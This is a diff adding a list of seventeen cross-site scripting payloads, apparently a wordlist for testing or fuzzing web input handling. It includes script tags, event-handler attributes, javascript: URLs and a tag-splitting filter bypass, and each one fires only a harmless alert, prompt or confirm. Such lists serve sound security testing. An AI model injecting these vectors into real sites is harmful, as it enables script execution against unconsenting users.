@@ -1,0 +1,17 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">Click</a>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+<marquee onstart=alert(1)>
+<math href="javascript:prompt(1)">
+<input autofocus onfocus=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+"><img src=x onerror=confirm(1)>
+"><svg onload=confirm`1`>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
